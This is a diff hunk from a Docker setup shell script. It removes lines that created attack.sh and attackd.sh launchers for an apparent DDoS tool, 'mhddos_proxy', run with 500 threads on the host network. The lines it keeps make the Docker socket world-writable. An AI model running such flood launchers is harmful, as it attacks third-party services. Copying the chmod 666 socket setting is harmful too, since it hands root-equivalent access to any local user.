@@ -31,9 +31,6 @@ sudo systemctl unmask docker.socket
 sudo systemctl start docker.service 
 sudo chmod 666 /var/run/docker.sock 
 sudo docker run hello-world
-echo "docker run -d -it --rm --pull always --net=host ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 500 --lang UA" >> attackd.sh
-sudo chmod 777 attackd.sh
-echo "docker run  -it --rm --pull always --net=host ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 500 --lang UA" >> attack.sh
-sudo chmod 777 attack.sh
+
 
 
